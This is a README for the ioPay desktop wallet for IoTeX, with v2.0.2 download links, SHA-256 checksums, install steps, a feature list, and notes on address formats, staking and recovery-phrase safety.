![ioPay Wallet](assets/banner-app.png)

<h1 align="center">ioPay Wallet</h1>

<p align="center"><em>The desktop wallet for IoTeX: your keys on your machine, staking, the IoTube bridge and DePIN income on Windows, macOS and Linux.</em></p>

<p align="center"><a href="#license"><img src="https://img.shields.io/badge/LICENSE-Apache--2.0-0969da?style=for-the-badge&labelColor=0B1733" alt="License: Apache-2.0"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2"><img src="https://img.shields.io/badge/RELEASE-v2.0.2-0969da?style=for-the-badge&labelColor=0B1733" alt="Release: v2.0.2"></a></p>

<p align="center"><a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0969da?style=for-the-badge&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0969da?style=for-the-badge&labelColor=0B1733&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0969da?style=for-the-badge&labelColor=0B1733&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| ![Windows](https://img.shields.io/badge/platform-Windows-0969da?style=flat-square&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white) | Windows 10 (1909) or later, 64-bit | [iopay-wallet-desktop-win-v2.0.2.exe](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-0969da?style=flat-square&labelColor=0B1733&logo=apple&logoColor=white) | macOS 12 or later | [iopay-wallet-desktop-macos-v2.0.2.dmg](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-0969da?style=flat-square&labelColor=0B1733&logo=linux&logoColor=white) | x64, Ubuntu 20.04 or later, or equivalent | [iopay-wallet-desktop-linux-v2.0.2.zip](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip) |

</div>

Windows ships one `.exe`, macOS one `.dmg`, and Linux a `.zip` holding a `.deb` and a `.pacman` package. Nothing else is published for this release.

All three files and their sizes are on the [ioPay Wallet v2.0.2 release page](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2); their SHA-256 values are published in the [app README](https://github.com/iopay-project/iopay-desktop-wallet).

> **Only download from this GitHub release page.** A build offered anywhere else is not this release, whatever name it carries.

<!-- SHA256:START -->

| File | SHA-256 |
|---|---|
| `iopay-wallet-desktop-win-v2.0.2.exe` | `929ed384b4946a791500da702b656885a7e05b68aa94b8bf85cf9f21443200c1` |
| `iopay-wallet-desktop-macos-v2.0.2.dmg` | `4fd9ef8451e33c1716513cc5569fe3b43d7ec1b7163986faa458351613fa52ab` |
| `iopay-wallet-desktop-linux-v2.0.2.zip` | `dda50fe7f43a9eaecb37a99662b938fa06b8e1ad0ed82cee9a59f0cedf555f75` |

<!-- SHA256:END -->

## What ioPay Wallet is

ioPay Wallet is a desktop application that holds IoTeX keys on the computer in front of you. It is published as Iopay Wallet Desktop, and the current release is v2.0.2, published on 19 November 2026. The application never asks you to create an account, and there is no server-side login: the PIN you set unlocks the app on that machine, and the recovery phrase is what actually owns the funds.

The wallet covers two spaces at once. The first is custody: creating or importing an account, showing the native `io1...` address beside the EVM `0x...` address for the same key, and keeping the secret material in the operating system's keychain. The second is the value side of IoTeX: delegating IOTX to a validator, reading rewards and the unstaking countdown, bridging through IoTube, swapping against XRC-20 tokens, and following DePIN device income from the same window.

It is not a hosted service and not a recovery desk: a wallet that can restore your phrase on request is a wallet that holds your phrase.

## Who it is for

- **Someone holding IOTX on an exchange or in the mobile app** who wants the keys on a desktop machine and a clear route to move the balance across.
- **A staker** who wants to pick a validator on evidence, watch rewards accumulate across long durations, and understand the gap between unstaking and withdrawing.
- **A bridge or swap user** who needs to move value between IoTeX, Ethereum, BSC and Polygon without pasting a key into a website.
- **A DePIN device owner** tracking earnings from several devices and registering device identity in one place.

## Install

<details open>
<summary><img src="https://img.shields.io/badge/platform-Windows-0969da?style=flat-square&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Windows" height="20"></summary>

1. Open the release page and download `iopay-wallet-desktop-win-v2.0.2.exe`.
2. Confirm the file name, the version and the size before running it: 63.8 MB for this release.
3. Run the installer and launch ioPay Wallet from the Start menu.
4. On first launch, create a new wallet or import an existing phrase, private key or keystore file.
5. Write the recovery phrase down offline before the account holds anything.

</details>

<details>
<summary><img src="https://img.shields.io/badge/platform-macOS-0969da?style=flat-square&labelColor=0B1733&logo=apple&logoColor=white" alt="macOS" height="20"></summary>

1. Download `iopay-wallet-desktop-macos-v2.0.2.dmg` from the release page; it is 21.5 MB.
2. Open the disk image and drag the application to Applications.
3. If macOS reports that the app is damaged, remove the downloaded copy and mount the disk image again rather than disabling system protection.
4. Launch the app and choose create or import.
5. Store the phrase offline, separately from the machine.

</details>

<details>
<summary><img src="https://img.shields.io/badge/platform-Linux-0969da?style=flat-square&labelColor=0B1733&logo=linux&logoColor=white" alt="Linux" height="20"></summary>

1. Download `iopay-wallet-desktop-linux-v2.0.2.zip`; it is 79.4 MB and it is a zip, not a `.deb` or an AppImage.
2. Unpack it into a directory you control.
3. Restore the execute bit on the binary if the archive did not preserve it.
4. Launch it from a terminal once, so a missing library names itself instead of failing silently.
5. Create or import the wallet, then write the phrase down offline.

</details>

The [system requirements guide](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/iopay-wallet-system-requirements.md) sets out what each platform needs and what the release does not publish.

## Features

- **Four ways in.** Create from a 12- or 24-word phrase, import a phrase, import a private key, or import a keystore file.
- **Two addresses per account.** Every account shows its `io1...` native address and its `0x...` EVM address, with copy buttons and a QR code.
- **Balances and history.** IOTX and XRC-20 tokens in one view, with each transaction's status, fee and block number.
- **Staking dashboard.** Delegate to a validator, compare validators on APY, uptime and commission, and watch the unstaking countdown.
- **Compounding and projection.** Re-stake rewards in one click, and read projected daily, monthly and yearly earnings from an amount you enter.
- **IoTube bridge.** Bridge between IoTeX and Ethereum, BSC and Polygon from inside the wallet, with a status tracker.
- **In-wallet swap.** Swap IOTX against XRC-20 tokens with adjustable slippage.
- **DePIN dashboard.** Device earnings, ioID device registration, burn-drop allocations per staking bucket, a project explorer and an earnings calculator.
- **Hardware signing.** Ledger and Trezor signing over USB, plus watch-only mode and address verification.
- **Tax export.** Cost basis, profit and loss, and a staking-rewards report you can export.

## Networks and addresses

ioPay Wallet works on IoTeX mainnet, chain ID 4689, with testnet on 4690. IoTeX is EVM-compatible, which is why one key produces two address encodings. The `io1...` form is the native IoTeX address; the `0x...` form is the EVM address for the same account. Both receive, and both belong to you. Which one to hand out depends on where the funds come from: a native transfer or an IoTeX-aware service expects the native form, while an EVM-chain bridge expects the `0x...` form.

Token variants are not interchangeable. Native IOTX pays gas and is what you stake. Legacy Ethereum ERC-20 IOTX is a separate redemption route and is not directly stakeable. WIOTX is wrapped, and CIOTX was the cross-chain representation that IIP-56 retired after the February 2026 bridge incident.

## How a transfer works here

1. Choose the account you are sending from and confirm it holds enough IOTX for the amount plus the network fee.
2. Paste the destination address and check which form it is in. A native address and an EVM address for the same account are different strings.
3. Enter the amount. The fee is shown before you confirm; the wallet itself does not take a cut of a transfer.
4. Confirm and sign. With a hardware device attached, the address is displayed on the device screen for you to verify.
5. Watch the status in the history view. A pending transaction is on the network; a broadcast failure never left the app.

## Where things live

Keys, the encrypted wallet store and settings live on your machine. The chain holds the balances and the staking positions, which is why a reinstall is safe and a lost phrase is not. Keep the data directory to carry history across a reinstall; keep the phrase to carry the account across anything.

## Guides

| Guide | What it answers |
|---|---|
| [What Is ioPay Wallet?](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/what-is-iopay-wallet.md) | What the desktop application is, and which of the several builds is current. |
| [Install ioPay Wallet on Windows](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/install-iopay-wallet-on-windows.md) | The download check, the installer and the first launch, written out step by step. |
| [How to Back Up an ioPay Seed Phrase](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/how-to-back-up-an-iopay-seed-phrase.md) | The one artifact that makes recovery possible, and how to store it safely. |
| [How to Stake IOTX in ioPay Wallet](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/how-to-stake-iotx-in-iopay-wallet.md) | Delegation, the duration steps and what a staking bucket actually means on IoTeX. |
| [Spotting Fake ioPay Wallet Downloads](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/spotting-fake-iopay-wallet-downloads.md) | Three release files, four checks, and the lookalike pages that outrank the real one. |

All sixty-two guides start at the [desktop setup and safety index](https://github.com/iopay-project/desktop-setup-and-safety).

## Common first questions

### Is there an ioPay account or a login?

No. The wallet is local, so there is no sign-up, no email and no server-side credential. The PIN unlocks the application on that machine and does not exist anywhere else.

### Where do the funds actually live?

On the IoTeX chain, at an address derived from your key. The application shows them and signs for them; it does not custody them, which is why a reinstall is safe and a lost phrase is not.

### Does ioPay Wallet publish a checksum or a signature?

The SHA-256 values above were computed on 20 November 2026 from the three v2.0.2 assets downloaded from this release page. No signing certificate or audit report is published with v2.0.2, so a matching hash confirms you hold the file the project published - it does not stand in for a signed build or an audit.

### Can I use a Ledger or a Trezor?

Both are supported through the application's signer providers. The device confirms the address on its own screen, so the key never has to touch the desktop.

## Security

**Write the recovery phrase down offline before the account holds value, and never type it into a page that asks you to verify, recover or migrate a wallet: no legitimate support route needs it.**

## Support

The project has no public issue tracker on these repositories and no support desk that holds credentials. The guides answer the questions that arrive most often; the [help guide](https://github.com/iopay-project/choosing-the-right-wallet/blob/main/how-to-get-help-with-iopay-wallet.md) explains which channel exists and which claims to ignore.

## License

Apache-2.0, matching the repository's own licence file.

---

[All guides](https://github.com/iopay-project/desktop-setup-and-safety) - [v2.0.2 release](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2) - [Repository](https://github.com/iopay-project/iopay-desktop-wallet)
